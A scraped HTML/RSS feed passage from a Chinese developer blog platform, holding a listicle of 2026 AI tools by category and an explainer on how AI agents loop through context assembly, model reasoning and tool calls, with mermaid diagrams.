                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">建议收藏 | 2026年AI工具封神榜：从Sora到混元3D，生产力彻底爆发</h2>
<p>整理了整整一周，这份涵盖 <strong>LLM、绘图、视频、编程、3D</strong> 等8大领域的AI工具清单.</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/862babbfcef84111b8dfa06036df67fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p-z5p2J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769093518&amp;x-signature=olkBtcUu0caML5T8lJx9C2JY9a8%3D" alt="截屏2026-01-15 22.47.18.png" loading="lazy"/></p>
<p><strong>导航链接</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fliush.top%2Fai.html" target="_blank" title="https://liush.top/ai.html" ref="nofollow noopener noreferrer">liush.top/ai.html</a></p>
<h3 data-id="heading-1">01 LLM 大语言模型</h3>
<ul>
<li>
<p>Gemini Pro (GM3 Pro) 生产力</p>
<p>推荐理由：100万token上下文，支持多模态输入（图片/音频/视频），适合深度研究与生产力。</p>
<p>★ 会员可解锁 Notebook LM 等高级工具</p>
</li>
<li>
<p>豆包 (Doubao) 新手推荐</p>
<p>推荐理由：免费、响应快，拥有Gemini约80%的能力，适合日常查询，AI版百度。</p>
</li>
</ul>
<h3 data-id="heading-2">02 图像生成 AI</h3>
<ul>
<li>
<p>Mid Journey V7 画质王</p>
<p>推荐理由：审美与出图质量最佳，适合高质量艺术图、壁纸、概念设计。</p>
</li>
<li>
<p>Nano Banana Pro 谷歌绘图</p>
<p>推荐理由：全能型绘图AI，适用于电商设计、科研绘图，被称为“绘图王者”。</p>
</li>
<li>
<p>Stable Diffusion + ComfyUI 专业级</p>
<p>推荐理由：专业设计师首选，支持精细化控制，适合需频繁修改的甲方项目。</p>
</li>
<li>
<p>我的AI (My AI平台) 聚合</p>
<p>推荐理由：集成多种绘图模型，自动调用最适合的AI，懂工作流的设计智能体。</p>
</li>
</ul>
<h3 data-id="heading-3">03 视频生成 AI</h3>
<ul>
<li>
<p>可灵 (Kling) 国产之光</p>
<p>推荐理由：国产优秀模型，角色一致性好，中文对白强，适合短剧创作。</p>
</li>
<li>
<p>Sora 2 (OpenAI) 物理模拟</p>
<p>推荐理由：擅长模拟物理世界，适合科研演示、复杂碰撞效果，接近真实模拟。</p>
</li>
<li>
<p>VEO 3.1 (Google) 全能</p>
<p>推荐理由：六边形战士，画质高、运镜自然，仅中文语音稍弱。</p>
</li>
<li>
<p>Runway (Gen-3) 影视级</p>
<p>推荐理由：广告片与微电影制作利器，强于镜头语言控制。</p>
</li>
<li>
<p>极梦/可零/微度 平价</p>
<p>推荐理由：面向普通用户的短视频生成工具，价格亲民，适合轻量级创作。</p>
</li>
</ul>
<h3 data-id="heading-4">04代码与程序生成</h3>
<ul>
<li>
<p>Cursor 开发者必备</p>
<p>推荐理由：最全面的AI编程IDE，适合懂代码的专业开发者深入使用。</p>
</li>
<li>
<p>Cloud Code 企业级</p>
<p>推荐理由：企业级开发常用，常与Cursor组合使用，提升团队效率。</p>
</li>
<li>
<p>Web (web.coding.ai) 无代码</p>
<p>推荐理由：专为“直觉编程”设计，只需描述需求即可生成网页或应用。</p>
</li>
<li>
<p>Google AI Studio 原型</p>
<p>推荐理由：Gemini会员可使用Build功能，适合快速构建原型页面。</p>
</li>
<li>
<p>豆包编程 免费</p>
<p>推荐理由：少有的免费AI编程工具，适合产品经理或零基础做演示。</p>
</li>
</ul>
<h3 data-id="heading-5">05 音频与音乐生成</h3>
<ul>
<li>
<p>Suno V5 音乐霸主</p>
<p>推荐理由：唯一档的AI音乐生成怪物，音质和人声真实度极高。</p>
</li>
<li>
<p>Sono Studio 专业制作</p>
<p>推荐理由：Suno旗下，支持分轨编辑（主唱/吉他/鼓组独立控制）。</p>
</li>
</ul>
<h3 data-id="heading-6">06 数字人与口播</h3>
<ul>
<li>
<p>爱说数字人 自媒体</p>
<p>推荐理由：适合克隆形象做口播自媒体，国内可用性强。</p>
</li>
<li>
<p>HeyGen (黑简简) 跨境</p>
<p>推荐理由：跨境场景首选，提供多国模特资源，适合国际推广。</p>
</li>
<li>
<p>禅境数字人 电商</p>
<p>推荐理由：专注电商场景，可用于商品展示与带货口播。</p>
</li>
</ul>
<h3 data-id="heading-7">07 3D模型生成</h3>
<ul>
<li>
<p>腾讯混元3D 国产强力</p>
<p>推荐理由：腾讯出品的3D大模型，支持文/图生3D，模型结构优秀，生成素材可用性高。</p>
</li>
<li>
<p>Tripo AI 快速生成</p>
<p>推荐理由：生成速度极快，支持文本和图像转3D，生成的模型自带骨骼绑定。</p>
</li>
<li>
<p>Rodin (Deemos) 专业级</p>
<p>推荐理由：国产顶尖3D大模型，生成的模型拓扑结构优秀，支持PBR材质，适合专业工作流。</p>
</li>
<li>
<p>Luma Genie 高保真</p>
<p>推荐理由：Luma AI出品，从文本或图片快速生成高保真3D模型，广泛用于游戏开发。</p>
</li>
<li>
<p>Meshy 游戏资产</p>
<p>推荐理由：专注于游戏资产生成的AI工具，能够快速生成带纹理的3D模型。</p>
</li>
</ul>
<h3 data-id="heading-8">08 辅助与工作流</h3>
<ul>
<li>
<p>Notebook LM 知识库</p>
<p>推荐理由：人生作弊系统，具备输入检索、思考处理、总结输出，整合知识。</p>
</li>
<li>
<p>N8N 自动化</p>
<p>推荐理由：自动化工作流平台，适合搭建复杂AI任务流水线，功能强大。</p>
</li>
<li>
<p>Prompt Hero / Base 提示词</p>
<p>推荐理由：寻找AI绘画提示词灵感的社区平台。</p>
</li>
<li>
<p>Proud Pilot 进阶</p>
<p>推荐理由：用于生成、优化提示词，建立评测体系，适合进阶用户。</p>
</li>
<li>
<p>商意见 商业</p>
<p>推荐理由：商家冷启动神器，集成账号诊断、内容写作、数字人、Auto CRM等功能。</p>
</li>
<li>
<p>Latest Box 资讯</p>
<p>推荐理由：前沿AI工具聚合站，可视化圆饼图呈现技术分布。</p>
</li>
<li>
<p>Web作者教程 教程</p>
<p>推荐理由：将AI编程方法系统化整理，适合新手入门。</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析：AI 智能体（Agent）是如何解决问题的？]]></title>    <link>https://juejin.cn/post/7595410455223074826</link>    <guid>https://juejin.cn/post/7595410455223074826</guid>    <pubDate>2026-01-15T15:03:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595410455223074826" data-draft-id="7594680314713391154" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析：AI 智能体（Agent）是如何解决问题的？"/> <meta itemprop="keywords" content="Agent,AI编程,前端"/> <meta itemprop="datePublished" content="2026-01-15T15:03:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="candyTong"/> <meta itemprop="url" content="https://juejin.cn/user/2242659449576952"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析：AI 智能体（Agent）是如何解决问题的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2242659449576952/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    candyTong
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T15:03:54.000Z" title="Thu Jan 15 2026 15:03:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">深入解析：AI 智能体（Agent）是如何解决问题的？</h2>
<p>在当今的 AI 浪潮中，我们经常听到“Agent（智能体）”这个词。但实际上，一个能够自主解决问题的 AI Agent 到底是如何工作的？它不仅仅是一个聊天机器人，更是一个拥有“手脚”和“神经系统”的复杂架构。</p>
<h3 data-id="heading-1">什么是 AI Agent？</h3>
<p>简单来说，<strong>AI Agent = 模型 + 工具 + 编排层 + 运行时服务</strong>。它是这四个要素的有机组合，利用大语言模型（LLM）在一个循环中完成特定目标。</p>
<p>如果把 Agent 比作一个人，那么它的架构可以这样理解：</p>
<ol>
<li><strong>模型（大脑）</strong>：核心的语言模型。它是推理引擎，负责处理信息、评估选项并做出决策。</li>
<li><strong>工具（双手）</strong>：连接外部世界的机制。API、代码函数、数据库检索等，让 Agent 能够执行文本生成以外的动作。</li>
<li><strong>编排层（神经系统）</strong>：管理 Agent 运行循环的治理过程。它负责规划（Planning）、记忆（Memory）和推理策略（如 Chain-of-Thought 或 ReAct）的执行。</li>
<li><strong>部署（身体）</strong>：将 Agent 托管在安全、可扩展的服务器上，集成监控和日志，使其成为可靠的服务。</li>
</ol>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    Root((AI Agent&lt;br/&gt;核心架构))

    %% 大脑 - 马卡龙蓝
    Root --&gt; Brain(大脑 The Brain)
    Brain --&gt; Model[模型 Model]
    Brain --&gt; Reason[推理与决策]
    style Brain fill:#C7CEEA,stroke:#9FA8DA,stroke-width:2px
    style Model fill:#C7CEEA,stroke:#9FA8DA
    style Reason fill:#C7CEEA,stroke:#9FA8DA

    %% 双手 - 马卡龙绿
    Root --&gt; Hands(双手 The Hands)
    Hands --&gt; Tools[工具 Tools]
    Hands --&gt; Conn[连接外部世界]
    style Hands fill:#B5EAD7,stroke:#80CBC4,stroke-width:2px
    style Tools fill:#B5EAD7,stroke:#80CBC4
    style Conn fill:#B5EAD7,stroke:#80CBC4

    %% 神经系统 - 马卡龙紫
    Root --&gt; Nervous(神经系统&lt;br/&gt;Nervous System)
    Nervous --&gt; Orchestration[编排层 Orchestration]
    Nervous --&gt; Memory[规划与记忆]
    style Nervous fill:#E0BBE4,stroke:#CE93D8,stroke-width:2px
    style Orchestration fill:#E0BBE4,stroke:#CE93D8
    style Memory fill:#E0BBE4,stroke:#CE93D8

    %% 身体 - 马卡龙橙
    Root --&gt; Body(身体 The Body)
    Body --&gt; Deployment[部署 Deployment]
    Body --&gt; Monitor[安全与监控]
    style Body fill:#FFDAC1,stroke:#FFAB91,stroke-width:2px
    style Deployment fill:#FFDAC1,stroke:#FFAB91
    style Monitor fill:#FFDAC1,stroke:#FFAB91

    style Root fill:#FFFFD1,stroke:#FFF59D,stroke-width:4px,color:#333,font-weight:bold
</code></pre>
<h3 data-id="heading-2">核心机制：上下文策略管理</h3>
<p>Agent 的本质，其实是一个致力于<strong>上下文策略管理</strong>的系统。</p>
<p>传统的软件开发像是在“搬砖”，开发者精确定义每一个逻辑步骤。而构建 Agent 更像是“导演”，你设定场景（指令）、选择演员（工具）、提供背景（数据），然后引导这位自主的“演员”去完成表演。</p>
<p>在这个过程中，Agent 解决问题不再是线性的，而是一个不断的循环：</p>
<ol>
<li><strong>组装上下文 (Assembling Context)</strong>：将系统指令、用户输入、对话历史、长期记忆、外部知识以及可用工具列表填入上下文窗口。</li>
<li><strong>提示模型 (Prompting the Model)</strong>：让模型基于当前上下文进行推理。</li>
<li><strong>观察结果 (Observing the Result)</strong>：解析模型的输出，判断是否需要调用工具。</li>
<li><strong>重新组装 (Re-assembling)</strong>：将工具的执行结果反馈回上下文，准备进行下一轮推理。</li>
</ol>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    Start([接收用户目标])

    subgraph Orchestration [Orchestration Layer 编排层]
        direction TB
        Assemble[组装上下文&lt;br/&gt;指令/历史/知识/工具定义]
        PromptLM[提示模型 Prompt LM]
        Reasoning{模型推理与决策}
        PlanAction[规划工具调用]
        ExecuteTool[执行工具 Tools]
        UpdateContext[更新上下文&lt;br/&gt;加入工具结果]
        GenerateAnswer[生成最终回答]

        Assemble --&gt; PromptLM
        PromptLM --&gt; Reasoning

        Reasoning --&gt;|需要更多信息/行动| PlanAction
        PlanAction --&gt; ExecuteTool
        ExecuteTool --&gt;|工具输出结果| UpdateContext
        UpdateContext --&gt; Assemble

        Reasoning --&gt;|任务完成| GenerateAnswer
    end

    Start --&gt; Assemble
    GenerateAnswer --&gt; End([交付结果])

    style Start fill:#FFFFD1,stroke:#FFF59D,stroke-width:1px,color:#333
    style End fill:#FFFFD1,stroke:#FFF59D,stroke-width:1px,color:#333
    style PromptLM fill:#C7CEEA,stroke:#9FA8DA,stroke-width:1px,color:#333
    style ExecuteTool fill:#B5EAD7,stroke:#80CBC4,stroke-width:1px,color:#333
    style Assemble fill:#FF9AA2,stroke:#EF5350,stroke-width:1px,color:#fff
    style Reasoning fill:#FFDAC1,stroke:#FFAB91,stroke-width:1px,color:#333
    style PlanAction fill:#E2F0CB,stroke:#AED581,stroke-width:1px,color:#333
    style UpdateContext fill:#E0BBE4,stroke:#CE93D8,stroke-width:1px,color:#333
    style GenerateAnswer fill:#FFFFD1,stroke:#FFF59D,stroke-width:1px,color:#333
</code></pre>
<h4 data-id="heading-3">流程详解</h4>
<ol>
<li><strong>接收目标</strong>：一切始于用户的请求。</li>
<li><strong>上下文组装</strong>：编排层将所有必要信息（包括“你可以使用哪些工具”）打包放入 LLM 的上下文窗口。</li>
<li><strong>模型推理</strong>：LLM（大脑）分析请求，决定是直接回答，还是需要查阅数据或执行操作。</li>
<li><strong>工具执行</strong>：如果模型决定使用工具（例如“查询天气”或“检索数据库”），编排层会拦截这个意图，执行相应的代码。</li>
<li><strong>闭环反馈</strong>：工具的执行结果不会直接给用户，而是被回填到上下文中。Agent 会“看到”工具的返回结果，然后再次思考：“我现在知道这些了，我能回答用户的问题了吗？”</li>
<li><strong>最终输出</strong>：当 Agent 认为掌握了足够信息，或者完成了所有步骤，它会生成最终的自然语言回复。</li>
</ol>
<h3 data-id="heading-4">总结</h3>
<p>随着 Agent 的兴起，我们正在从单纯的“提示词工程（Prompt Engineering）”转向更复杂的“<strong>上下文工程（Context Engineering）</strong>”。</p>
<p>我们需要管理的不再是一句话的 Prompt，而是一个动态的、包含了事实、工具、历史和用户画像的完整上下文环境。当一个 Agent 被配置了清晰的指令、可靠的工具和强大的记忆时，它就不再仅仅是自动化脚本，而是一个能够应对未知挑战、通过推理解决问题的团队新成员。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[复制即所得:PasteMD让Markdown粘贴Office不再有格式烦恼]]></title>    <link>https://juejin.cn/post/7595423299061219337</link>    <guid>https://juejin.cn/post/7595423299061219337</guid>    <pubDate>2026-01-15T13:14:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423299061219337" data-draft-id="7595410455222894602" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="复制即所得:PasteMD让Markdown粘贴Office不再有格式烦恼"/> <meta itemprop="keywords" content="开源"/> <meta itemprop="datePublished" content="2026-01-15T13:14:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="修己xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" 